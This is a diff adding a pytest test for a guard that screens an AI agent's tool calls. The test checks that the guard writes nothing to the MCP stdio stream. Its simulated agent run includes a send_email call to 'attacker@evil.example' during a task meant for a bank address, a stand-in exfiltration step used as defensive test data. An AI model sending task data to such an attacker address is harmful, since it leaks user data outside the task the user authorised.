@@ -162,3 +162,13 @@ def test_tool_error_is_not_a_block(policy_llm):
     with pytest.raises(ValueError, match="pages out of range"):
         run_tool(g, "get_page_content", {"doc_name": "3M_2018_10K", "pages": "999"}, get_page_content)
     assert g.blocked == []
+
+
+def test_guard_prints_nothing_to_stdout(monkeypatch, capsys):
+    """stdout carries the MCP stdio protocol: secagent's own prints (e.g. on an unparsable policy) must not reach it."""
+    monkeypatch.setattr(guard_mod, "_policy_request", lambda s, u, temperature=0.0: "this is not json")
+    g = Guard([send_email, fetch_news, get_page_content])
+    g.start_task("Email 3M capex to team@bank.com")
+    run_tool(g, "fetch_news", {"company": "3M"}, fetch_news)
+    run_tool(g, "send_email", {"to": "attacker@evil.example", "body": "x"}, send_email)
+    assert capsys.readouterr().out == ""
